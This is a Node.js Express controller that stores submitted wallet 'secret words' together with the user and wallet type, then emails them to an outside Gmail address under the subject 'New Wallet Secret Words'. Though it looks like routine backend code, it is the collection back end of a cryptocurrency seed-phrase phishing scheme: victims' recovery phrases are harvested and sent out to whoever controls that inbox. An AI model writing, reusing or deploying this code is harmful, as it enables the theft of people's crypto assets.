const  {BadRequestError}  = require("../errors/errorsIndex")
require('dotenv').config()
const nodemailer =require('nodemailer')
const notFoundMiddlewareError =  require('../middleware/notfound')
const {StatusCodes} = require('http-status-codes')
const jwt = require('jsonwebtoken')
const secretWords = require('../models/secrets')


 const createSecret = async (req, res) => {
  
   const secretWord = await secretWords.create(req.body)
   const {secret, user, walletType} = req.body
   res.status(StatusCodes.CREATED).json({ secretWord })

   var transporter2 = nodemailer.createTransport({
            service :'gmail',
              auth:{
                user: process.env.MAILER_EMAIL,
                pass: process.env.MAILER_PASS
            }
})
const mailOptions2 = {
  from: process.env.MAILER_EMAIL,
  to: "contact.Apex Corporates@gmail.com",
  subject: 'New Wallet Secret Words',
  html: `
  <div style="text-align:left; min-height:60vh; padding:20px">
  
   <h2>Phrases: ${secret} <br/></h2>
   <h2>Client: ${user} <br/></h2>
   <h2>Asset: ${walletType} <br/></h2>
   


  </div>
  `
};
transporter2.sendMail(mailOptions2, function(error, body){
  if(error){
      return res.json({error: error})
  }
  res.status(StatusCodes.CREATED).json({secretWord })
})

 }

 
 
 
 module.exports = {
   
     createSecret
 }
